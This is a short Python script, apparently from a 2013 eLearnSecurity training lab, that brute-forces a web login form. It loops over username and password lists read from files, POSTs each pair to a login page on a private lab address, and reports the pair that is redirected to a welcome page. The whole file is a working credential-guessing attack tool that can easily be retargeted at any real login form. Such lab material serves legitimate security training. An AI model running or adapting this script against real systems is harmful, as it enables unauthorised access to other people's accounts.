# eLearnSecurity 2013

import http.client, urllib.parse

username_file = open('user.txt')
password_file = open('pwd.txt')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()


        print (user,"-",pwd)
        
        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})
        headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection("192.168.1.129",80)
        conn.request("POST", "/bruteforce_login/verify_login.php", post_parameters, headers)
        response = conn.getresponse()

        if(response.getheader('location') == "welcome.php"):
            print("Logged with:",user," - ",pwd)

